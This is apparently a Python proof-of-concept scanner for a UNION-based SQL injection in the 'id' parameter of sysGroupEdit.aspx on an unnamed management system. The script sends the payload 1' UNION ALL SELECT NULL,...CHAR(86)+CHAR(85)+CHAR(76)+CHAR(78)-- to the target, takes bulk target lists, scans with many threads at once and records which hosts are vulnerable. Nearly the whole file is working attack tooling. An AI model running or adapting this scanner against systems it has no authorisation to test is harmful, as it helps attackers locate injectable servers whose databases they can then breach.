#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
漏洞名称：某管理系统 sysGroupEdit.aspx SQL注入（联合查询）
漏洞类型：UNION-based SQL Injection
影响参数：id
检测原理：构造UNION SELECT返回特征字符串，通过响应内容匹配判断
作者：weichao
版本：1.0
"""

import argparse
import requests
import urllib3
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
   ██╗    ██╗███████╗██╗ ██████╗██╗  ██╗ █████╗  ██████╗ 
   ██║    ██║██╔════╝██║██╔════╝██║  ██║██╔══██╗██╔═══██╗
   ██║ █╗ ██║█████╗  ██║██║     ███████║███████║██║   ██║
   ██║███╗██║██╔══╝  ██║██║     ██╔══██║██╔══██║██║   ██║
   ╚███╔███╔╝███████╗██║╚██████╗██║  ██║██║  ██║╚██████╔╝
    ╚══╝╚══╝ ╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
                                                   
[*] 某管理系统 sysGroupEdit.aspx SQL注入检测工具 (UNION)
[*] 作者: weichao
[*] 版本: 1.0
"""

# 正常请求参数（无注入）
NORMAL_PARAMS = {"id": "1"}
# 注入payload：使用UNION SELECT返回特征字符串 "VULN"（ASCII: V=86, U=85, L=76, N=78）
# 注意：这里假设目标表有6列（根据原payload的NULL数量），若列数不同需调整
UNION_PAYLOAD = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(86)+CHAR(85)+CHAR(76)+CHAR(78)-- "
# 特征字符串（用于匹配）
MAGIC_STRING = "VULN"


def check_vulnerability(url, timeout=10, proxy=None, debug=False):
    """
    检测单个目标是否存在联合查询注入
    返回: (url, is_vuln, message)
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    # 注意：漏洞路径为 /Web/SysManage/sysGroupEdit.aspx
    base_url = url.rstrip("/") + "/Web/SysManage/sysGroupEdit.aspx"

    proxies = {"http": proxy, "https": proxy} if proxy else None

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Cookie": "ASP.NET_SessionId=z0e2f01cfmzdnoi3ysmhy22i"  # 可自定义
    }

    try:
        # 1. 发送正常请求（基线，用于排除误报）
        resp_normal = requests.get(
            base_url,
            params=NORMAL_PARAMS,
            headers=headers,
            proxies=proxies,
            timeout=timeout,
            verify=False
        )
        normal_text = resp_normal.text

        # 2. 发送注入请求
        inject_params = {"id": UNION_PAYLOAD}
        resp_inject = requests.get(
            base_url,
            params=inject_params,
            headers=headers,
            proxies=proxies,
            timeout=timeout,
            verify=False
        )
        inject_text = resp_inject.text

        if debug:
            tqdm.write(f"[DEBUG] {base_url} 正常响应长度: {len(normal_text)}, 注入响应长度: {len(inject_text)}")

        # 3. 判断：注入响应中包含特征字符串，且正常响应中不含
        if MAGIC_STRING in inject_text and MAGIC_STRING not in normal_text:
            return url, True, f"存在漏洞 (响应包含特征字符串 '{MAGIC_STRING}')"
        else:
            return url, False, "未发现漏洞"

    except requests.exceptions.RequestException as e:
        return url, False, f"请求失败: {str(e)}"


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="某管理系统 sysGroupEdit.aspx SQL注入检测POC (UNION)")
    parser.add_argument('-u', '--url', type=str, help='单个目标URL（如 http://192.168.1.100:8001）')
    parser.add_argument('-f', '--file', type=str, help='批量目标文件，每行一个URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发线程数 (默认10)')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时(秒)')
    parser.add_argument('--proxy', type=str, help='代理地址 (例如 http://127.0.0.1:7890)')
    parser.add_argument('--debug', action='store_true', help='开启调试输出')
    parser.add_argument('-o', '--output', type=str, default='success.txt', help='结果保存文件 (默认success.txt)')
    args = parser.parse_args()

    # 获取目标列表
    targets = []
    if args.url:
        targets = [args.url]
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] 错误: 文件 '{args.file}' 不存在")
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)

    print(f"[*] 共加载 {len(targets)} 个目标，开始扫描...")
    results = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {
            executor.submit(
                check_vulnerability,
                url,
                args.timeout,
                args.proxy,
                args.debug
            ): url for url in targets
        }

        with tqdm(total=len(targets), desc="扫描进度", unit="目标") as pbar:
            for future in as_completed(future_to_url):
                url, is_vuln, msg = future.result()
                if is_vuln:
                    results.append(url)
                    tqdm.write(f"[+] {url} -> {msg}")
                else:
                    if args.debug:
                        tqdm.write(f"[-] {url} -> {msg}")
                pbar.update(1)

    # 保存结果
    if results:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write("\n".join(results))
        print(f"\n[+] 扫描完成，发现 {len(results)} 个漏洞目标，已保存至 {args.output}")
    else:
        print("\n[-] 未发现漏洞目标")


if __name__ == "__main__":
    main()